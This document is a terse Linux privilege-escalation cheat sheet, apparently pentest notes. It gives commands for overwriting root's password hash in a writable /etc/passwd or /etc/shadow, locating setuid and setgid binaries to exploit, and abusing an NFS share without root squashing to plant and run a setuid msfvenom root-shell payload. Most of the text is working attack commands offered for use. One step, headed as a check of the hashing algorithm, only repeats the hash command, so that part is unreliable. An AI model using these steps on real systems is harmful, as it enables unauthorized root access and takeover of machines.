### Check For write perm of /etc/passwd and /etc/shadow file
```
openssl passwd new_password
```
#### Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
```
mkpasswd -m sha-512 newpasswordhere
```
#### Check the hashing algorithm used
```
mkpasswd -m sha-512 newpasswordhere
```
#### Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

#### Find files having setuid and setgid flag se and search for exploits
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

#### NFS
- Check if root squashing is enabled or not "cat /etc/exports"
- If disabled switch to root in your machine
```
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```
From victims machine execute the msfvenom payload. /tmp/shell.elf
